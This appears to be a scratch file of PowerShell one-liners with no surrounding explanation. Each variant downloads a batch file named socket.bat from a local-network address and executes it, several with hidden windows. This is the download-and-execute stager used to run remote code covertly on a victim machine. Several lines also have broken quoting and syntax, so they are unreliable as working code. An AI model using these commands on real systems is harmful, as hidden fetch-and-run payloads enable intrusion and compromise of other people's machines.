powershell -c "start-process powershell -wait -win hidden -argument -c (New-Object Net.WebClient).DownloadFile('http://192.168.0.133/socket.bat','C:\socket.bat'); start-process C:\socket.bat -win hidden"

start-process -FilePath 'powershell' -ArgumentList '-command '(New-Object Net.WebClient).DownloadFile('http://192.168.0.133/socket.bat','C:\socket.bat')'';
start-process -FilePath 'C:\socket.bat';


invoke-expression '(New-Object Net.WebClient).DownloadFile(""http://192.168.0.133/socket.bat, C:\socket.bat)';
start-process -FilePath = 'C:\socket.bat';
$url = 'http://192.168.0.133/socket.bat';
$path = 'C:\socket.bat';
(New-Object Net.WebClient).DownloadFile('http://192.168.0.133/socket.bat', 'C:\socket.bat')'

start-process -FilePath 'powershell' -ArgumentList '-command (New-Object Net.WebClient).DownloadFile('"+arg1+"', '"+arg2+"')' 